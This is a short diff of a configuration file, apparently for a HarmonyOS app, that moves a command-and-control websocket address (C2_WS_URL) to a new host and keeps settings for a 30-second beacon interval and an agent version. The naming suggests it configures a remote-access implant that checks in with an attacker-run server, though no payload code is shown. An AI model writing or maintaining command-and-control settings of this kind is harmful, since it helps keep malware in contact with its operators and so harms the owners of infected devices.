@@ -4,7 +4,7 @@
  * if your DevEco Studio build system supports them.
  */
 export const Config = {
-  C2_WS_URL:        "wss://c2.bixtx.com:3001",
+  C2_WS_URL:        "wss://bixtx.onrender.com/agent",
   BEACON_INTERVAL:  30_000,          // milliseconds
   AGENT_VERSION:    "4.7.2",
   PLATFORM:         "harmony",
